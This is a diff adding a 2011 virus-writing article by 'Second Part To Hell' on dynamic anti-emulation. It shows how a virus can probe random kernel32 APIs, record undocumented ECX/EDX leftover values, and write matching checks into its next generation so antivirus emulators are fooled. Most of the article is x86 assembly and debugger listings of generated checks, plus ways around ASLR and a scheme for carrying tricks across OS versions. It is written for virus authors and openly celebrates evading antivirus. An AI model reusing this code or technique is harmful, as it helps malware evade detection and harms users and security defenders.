@@ -1,0 +1,567 @@
+
+
+            ****************************************************
+               Dynamic Anti-Emulation using Blackbox Analysis
+                                    by Second Part To Hell
+            ****************************************************
+
+
+
+  Index:
+  ******
+
+  1) Introduction
+
+  2) Idea
+
+  3) Implementation
+  3.1) Finding a random API
+  3.2) Getting number of API parameters
+  3.3) Analysing the Black-Box API
+  3.4) Creating Anti-Emulation Code
+  3.5) Examples: Autonomous generated Anti-Emulation Tricks
+  3.6) Working around ASLR
+
+  4) Possible extention: Remembering the tricks
+
+  5) Thought experiment: Are we learning?
+
+  6) Conclusion
+
+
+
+
+
+
+
+
+
+
+  1) Introduction
+
+     Viruses are threatened by Emulators. One can use Anti-Emulator tricks to
+     avoid emulation, until AVs implement the new trick intro their program -
+     so this benefit can not exceed a few hours?
+
+     It can, if the virus can find and implement new Anti-Emulation tricks by
+     itself. This text descibes how it can be done.
+
+
+
+
+
+
+
+
+  2) Idea
+
+     Standard Windows APIs use EAX, ECX, EDX as internal registers; after an
+     API call, EAX contains the return value, and ECX & EDX contain
+     undocumented leftover values. Gabor Szappanos[1] and Peter Ferrie[2]
+     show that these registers are used in Anti-Emulation tricks alot and AVs
+     need to analyse and implement each new trick manually.
+
+     Now the idea is to find automatically such leftovers in random APIs, and
+     implement a branch in the next generation. The viruscode will only be
+     executed if the register values match with the original result.
+
+     If some emulators is not aware of the random API's undocumented leftover
+     values, it will be fooled to exit the program. :-)
+
+
+
+
+
+
+
+
+  3) Implementation
+
+     The basic concept is very simple: 
+        -> Search for a random API in a DLL (for instance KERNEL32.DLL)
+        -> Find out the number N of its paramaters (a.k.a PUSHes)
+        -> Prepare N random parameters
+        -> Call API with parameters
+        -> Save ECX & EDX
+        -> Randomize Registers (leftovers can depend on that)
+        -> Call API again with same parameters
+        -> Compare ECX & EDX
+        -> If equal, create Anti-Emulation Code + write it to next generation
+
+
+     This is very simple, so just short explanation of some crucial parts.
+
+
+
+
+
+  3.1) Finding a random API
+
+       First we need to find a random API. This can be very easy using
+       ordinal numbers of DLL functions:
+
+       - - - - - - - - - - - - - - - - - -
+
+          push    kernel32            ; Get Kernel32
+          stdcall dword[LoadLibrary]   
+
+
+          call    GetRandomNumber
+          mov     eax, dword[RandomNumber]
+          and     eax, (0x400 - 1) ; 0-1023
+          mov     dword[RandOrdinal], eax
+
+          push    dword[RandOrdinal]
+          push    dword[hKernel]
+          stdcall dword[GetProcAddress]
+
+          ; address of random API in EAX :)
+	
+              [...]
+
+          kernel32 db 'kernel32.dll', 0x0
+
+       - - - - - - - - - - - - - - - - - -
+
+
+
+
+
+  3.2) Getting number of API parameters
+
+       Simple idea: push 16 DWORDs to the stack (no API has more parameters),
+       save ESP, call the API, and compare ESP with old ESP:
+
+            number(parameter) = (newESP-oldESP)/4
+
+       Obviously, one can not call random APIs without exception handling.
+       The easiest way is Vectorized Exception Handling, which is implemented
+       as AddVectoredExceptionHandler and RemoveVectoredExceptionHandler:
+
+       - - - - - - - - - - - - - - - - - -
+       macro VEH_TRY c*
+       {
+               mov     dword[sESP], esp
+
+               push    VEH_Handler#c
+               push    0x1
+               stdcall dword[AddVectoredExceptionHandler]
+               mov     dword[hVEH], eax
+       }
+
+       macro VEH_EXCEPTION c*
+       {
+               mov     dword[bException], 0x0
+               jmp     VEH_NoException#c
+
+            VEH_Handler#c:
+               mov     esp, dword[sESP]
+               mov     dword[bException], 0x1
+       }
+
+       macro VEH_END c*
+       {
+            VEH_NoException#c:
+               mov     eax, dword[hVEH]
+               push    eax
+               stdcall dword[RemoveVectoredExceptionHandler]
+       }
+
+
+
+        mov     dword[s2ESP], esp       ; Save original ESP
+        times 0x10: push 0              ; PUSH 16 parameters
+
+        VEH_TRY FirstRun
+        ;{
+                stdcall dword[RndFctAddress]   ; try it ;)
+        ;}
+        VEH_EXCEPTION FirstRun
+        ;{                                     ; no success :-/
+               mov     esp, dword[s2ESP]       ; restore ESP
+        ;}
+        VEH_END FirstRun
+
+        cmp     dword[bException], 0x1
+        je      SearchRandomAPI
+
+
+        ; Get Number of arguments used by this random API :)
+        mov     eax, esp
+        sub     eax, dword[sESP]
+        shr     eax, 2                  ; eax/=4 -> number of arguments
+        mov     dword[RndFctArguments], eax
+
+        mov     esp, dword[s2ESP]        ; restore ESP      
+       - - - - - - - - - - - - - - - - - -
+
+        Number of arguments are in dword[RndFctArguments] now.
+
+
+
+
+
+  3.3) Analysing the Black-Box API
+
+       What we want to do can be pictured:
+
+                 _________
+    random      |         |
+    parameter   |         |
+   -----------> |  ? ? ?  | \
+                |         |  \
+                |_________|   \
+                               \
+                                \
+                                  ---> Same ECX & EDX ?
+    different registers         /
+                 _________     /
+    same        |         |   /
+    parameter   |         |  /
+   -----------> |  ? ? ?  | /
+                |         |
+                |_________|
+
+
+       We perform first API call with random parameters, then change
+       registers and perform another API call with same parameters:
+
+
+       - - - - - - - - - - - - - - - - - -
+        call    RandomizeArguments
+        call    PushNArgumentsToStack
+
+        VEH_TRY RealRun1
+        ;{
+                stdcall dword[RndFctAddress]        ; Call random API
+
+                mov     dword[RndFct_RV_ECX], ecx   ; save ECX
+                mov     dword[RndFct_RV_EDX], edx   ; save EDX
+        ;}
+        VEH_EXCEPTION RealRun1
+        ;{
+                mov     esp, dword[s2ESP]           ; restore ESP
+        ;}
+        VEH_END RealRun1
+
+        cmp     dword[bException], 0x1
+        je      ThisIsNoGoodAPI
+
+
+        ; Run again and compare ECX and EDX (Time-APIs and stuff like that, dependence on register values)
+        call    PushNArgumentsToStack
+
+        VEH_TRY RealRun2
+        ;{
+                call    RandomizeRegisters        ; change EAX, ECX, EDX, EBX to random value
+
+                stdcall dword[RndFctAddress]      ; call random API again
+
+                sub     ecx, dword[RndFct_RV_ECX] ; ECX has to be the same, otherwise it cant be used
+                jz      RealRun2ECX_OK
+
+                        xor     eax, eax          ; if not the same:
+                        mov     dword[eax], 42    ; throw exception
+
+                RealRun2ECX_OK:
+                sub     edx, dword[RndFct_RV_EDX] ; EDX has to be the same as well
+                jz      RealRun2EDX_OK
+
+                        xor     eax, eax
+                        mov     dword[eax], 42
+
+                RealRun2EDX_OK:
+        ;}
+        VEH_EXCEPTION RealRun2
+        ;{
+                mov     esp, dword[s2ESP]         ; restore ESP
+        ;}
+        VEH_END RealRun2
+
+        cmp     dword[bException], 0x1
+        je      ThisIsNoGoodAPI
+
+                ; if we are here, we have a good API with good parameters :)
+       - - - - - - - - - - - - - - - - - -
+
+
+
+
+
+  3.4) Creating Anti-Emulation Code
+
+       We push the arguments, call the API and compare ECX and EDX APIs.
+       However, as these leftover values we found are undefined, it is very
+       likely that they are dependent on the OS version.
+
+       We can simply overcome the problem by calling GetVersion and comparing
+       with the version-number where we found the Anti-Emulation trick.
+
+       The most simple implementation:
+
+       - - - - - - - - - - - - - - - - - -
+        call    dword[GetVersion]
+        cmp     eax, OS_VERSION
+        jne     StartCode           ; if we are on a different OS, we should
+                                    ; not perform the test, otherwise the code
+                                    ; may not be executed.
+
+        push    parameter1
+        push    parameter2
+        [...]
+        push    parameterN
+        call    RandomAPI_Address
+
+        cmp     ecx, ECX_VALUE_FROM_TEST
+        je      ECX_OK
+
+                ret
+
+        ECX_OK:
+
+        cmp     edx, EDX_VALUE_FROM_TEST
+        je      EDX_OK
+
+                ret
+
+        EDX_OK:
+
+        StartCode:
+                ; if we are here, we are most likely not emulated :)
+       - - - - - - - - - - - - - - - - - -
+
+
+
+
+
+  3.5) Examples: Autonomous generated Anti-Emulation Tricks
+
+       Finally - let's have a look at the results!
+
+
+       That one uses kernel32.Beep:
+       - - - - - - - - - - - - - - - - - -
+          00402000 > $ FF15 E0304000  CALL DWORD PTR DS:[<&KERNEL32.GetVersion>;  kernel32.GetVersion
+          00402006   . 3D 0501280A    CMP EAX,0A280105
+          0040200B   . 75 5F          JNZ SHORT ovilslmh.0040206C
+          0040200D   . 68 63F8D01F    PUSH 1FD0F863                            ; /Duration = 533788771. ms
+          00402012   . 68 601C3A77    PUSH 773A1C60                            ; |Frequency = 773A1C60 (2000297056.)
+          00402017   . E8 8B5A437C    CALL kernel32.Beep                       ; \Beep
+          0040201C   . 81F9 64FF0600  CMP ECX,6FF64
+          00402022   . 74 01          JE SHORT ovilslmh.00402025
+          00402024   . C3             RETN
+          00402025   > 81FA 14E5917C  CMP EDX,ntdll.KiFastSystemCallRet
+          0040202B   . 74 01          JE SHORT ovilslmh.0040202E
+          0040202D   . C3             RETN
+          0040202E   > 90             NOP
+       - - - - - - - - - - - - - - - - - -
+
+
+       Here we have one with kernel32.WriteTapemark:
+       - - - - - - - - - - - - - - - - - -
+          00402000 > $ FF15 E0304000  CALL DWORD PTR DS:[<&KERNEL32.GetVersion>;  kernel32.GetVersion
+          00402006   . 3D 0501280A    CMP EAX,0A280105
+          0040200B   . 75 5F          JNZ SHORT ijczijcj.0040206C
+          0040200D   . 68 B5A01E5E    PUSH 5E1EA0B5
+          00402012   . 68 4AC3FFA8    PUSH A8FFC34A
+          00402017   . 68 BBE2A2B7    PUSH B7A2E2BB
+          0040201C   . 68 D8B311A9    PUSH A911B3D8
+          00402021   . E8 A2A2467C    CALL kernel32.WriteTapemark
+          00402026   . 81F9 61F6917C  CMP ECX,7C91F661
+          0040202C   . 74 01          JE SHORT ijczijcj.0040202F
+          0040202E   . C3             RETN
+          0040202F   > 81FA 07000000  CMP EDX,7
+          00402035   . 74 01          JE SHORT ijczijcj.00402038
+          00402037   . C3             RETN
+          00402038   > 90             NOP
+       - - - - - - - - - - - - - - - - - -
+
+
+       And the third one - kernel32.SetComPlusPackageInstallStatus:
+       - - - - - - - - - - - - - - - - - -
+          00402000 > $ FF15 E0304000  CALL DWORD PTR DS:[<&KERNEL32.GetVersion>]                ;  kernel32.GetVersion
+          00402006   . 3D 0501280A    CMP EAX,0A280105
+          0040200B   . 75 5F          JNZ SHORT poxwpade.0040206C
+          0040200D   . 68 A0769B27    PUSH 279B76A0
+          00402012   . E8 8EAC467C    CALL kernel32.SetComPlusPackageInstallStatus
+          00402017   . 81F9 61F6917C  CMP ECX,7C91F661
+          0040201D   . 74 01          JE SHORT poxwpade.00402020
+          0040201F   . C3             RETN
+          00402020   > 81FA 00000000  CMP EDX,0
+          00402026   . 74 01          JE SHORT poxwpade.00402029
+          00402028   . C3             RETN
+          00402029   > 90             NOP
+       - - - - - - - - - - - - - - - - - -
+
+
+
+
+
+  3.6) Working around ASLR
+
+       ASLR means Address Space Layout Randomization, and has been introduced
+       in Windows since WinVista. ASLR is used to make exploiting of
+       vulnerabilities more difficult, by making addresses of libraries
+       (and other things) random in memory.
+
+       This concerns us for two reasons:
+
+       1) ECX or EDX can contain library addresses, which are different
+          after next reboot.
+
+       2) The CALLs so far use fixed pointers to kernel32.dll functions.
+
+       Both are very easy to solve:
+       ad 1) At creation time, we compare ECX and EDX with kernel-addresse:
+
+       - - - - - - - - - - - - - - - - - -
+           mov     eax, dword[RndFct_RV_ECX]
+           and     eax, 0xFF00'0000
+           mov     ebx, dword[hKernel]
+           and     ebx, 0xFF00'0000
+           cmp     eax, ebx
+           je      NoECX_Kernel
+       - - - - - - - - - - - - - - - - - -
+
+       ad2) We use a different Anti-Emulator header, which gets its kernel32
+            addresse at runtime using LoadLibrary:
+
+       - - - - - - - - - - - - - - - - - -
+          00402000 > $ FF15 E0304000  CALL DWORD PTR DS:[<&KERNEL32.GetVersion>;  kernel32.GetVersion
+          00402006   . 3D 0501280A    CMP EAX,0A280105
+          0040200B   . 75 6B          JNZ SHORT vencfwbe.00402078
+          0040200D   . 68 78104000    PUSH vencfwbe.00401078                   ; /FileName = "kernel32.dll"
+          00402012   . FF15 E4304000  CALL DWORD PTR DS:[<&KERNEL32.LoadLibrar>; \LoadLibraryA
+          00402018   . 05 271C0600    ADD EAX,61C27
+          0040201D   . 68 CC8DA293    PUSH 93A28DCC
+          00402022   . 68 15B832DB    PUSH DB32B815
+          00402027   . FFD0           CALL EAX
+          00402029   . 81FA 01000000  CMP EDX,1
+          0040202F   . 74 01          JE SHORT vencfwbe.00402032
+          00402031   . C3             RETN
+       - - - - - - - - - - - - - - - - - -
+
+       ASLR is no way a problem for us -> Everything fine again :)
+
+
+
+
+
+
+
+
+  4) Possible extention: Remembering the tricks
+
+     We saw how to autonomous develope new Anti-Emulation tricks. In this
+     simple implementation, in every generation we overwrite the old code,
+     thus "forget" about the old trick.
+
+     We can save the old trick, and merge it with new tricks. This has some
+     nice advantages: When the virus runs at OS1,it creates and saves Trick1.
+     Now it arrives at another computer with OS2, and creates Trick2. When
+     it "remembers" the old trick, it can create a new Anti-Emulation code
+     like this:
+
+       - - - - - - - - - - - - - - - - - -
+        call    dword[GetVersion]
+        cmp     eax, OS_VERSION1
+        jne     NotOS1
+
+                push OS1_Parameters
+                call OS1_RandomAPI
+                cmp  ecx|edx, ECX1_VALUE|EDX1_VALUE
+                je   StartCode
+
+                     ret
+
+
+        NotOS1:
+        cmp     eax, OS_VERSION2
+        jne     NotOS2
+
+                push OS2_Parameters
+                call OS2_RandomAPI
+                cmp  ecx|edx, ECX2_VALUE|EDX2_VALUE
+                je   StartCode
+
+                     ret
+
+           [...]
+
+        StartCode:
+       - - - - - - - - - - - - - - - - - -
+
+     We can also save more than one Trick per OS. Then we can eigher use
+     all of them directly in the code, or use a low number of them and save
+     the other Tricks in .data section.
+
+     Advantage: When we travel from OS1 to OS2, and we have N Tricks saved,
+                we can vary them even we dont have access to OS1 anymore.
+                Varying is an advantage when we found broken tricks, and
+                when AVs adapt.
+
+     Even it sounds fancy, it is pretty simple to code. :-)
+
+
+
+
+
+
+
+
+  5) Thought experiment: Are we learning?
+
+     Let's have a look at Tom Mitchell's widely quoted definition
+     of "learning":
+
+                A computer program is said to learn from experience E with
+                respect to some class of tasks T and performance measure P,
+                if its performance at tasks in T, as measured by P, improves
+                with experience E.
+
+     What are E, T and P in our case?
+
+          experience E ... Blackbox analysis of a random API
+          task T       ... avoid being emulated
+          measure P    ... binary measure: being emulated or not
+
+     It seems very reasonable that the new developed Anti-Emulation tricks
+     improve its ability of not being emulated.
+
+     So we have some autonomous learning computer virus. Wow - thats cool :-)
+
+
+
+
+
+
+
+
+  6) Conclusion
+
+     We know now how a computer virus can analyse its environment and create
+     new Anti-Emulation tricks - everything autonomous and very simple.
+
+     I've used the key technique - Blackbox Analysis - already in one other
+     project (that time for finding new mutations)[3]; it seems like nobody
+     else has ever thought about using this concept in viruses. Therefore I
+     suspect that there are several other surprising possibilities that
+     should be uncovered one day. :-)
+
+
+
+                                                          Second Part To Hell
+                                                                 October 2011
+
+
+
+
+
+[1] Gabor Szappanos, "Okay, so you are a Win32 emulator...", VirusBulletin October 2011.
+
+[2] Peter Ferrie, "Anti-Unpacker Tricks (1)", CARO Workshop, May 2008.
+    Peter Ferrie, "Anti-Unpacker Tricks (2)", Virus Bulletin December 2008 - June 2009.
+    Peter Ferrie, "Anti-Unpacker Tricks (3)", Virus Bulletin May 2010 - November 2010.
+
+[3] SPTH, "Code Mutations via Behaviour Analysis", Virus Writing Bulletin, December 2010,
+    http://vxheavens.com/lib/vsp27.html.
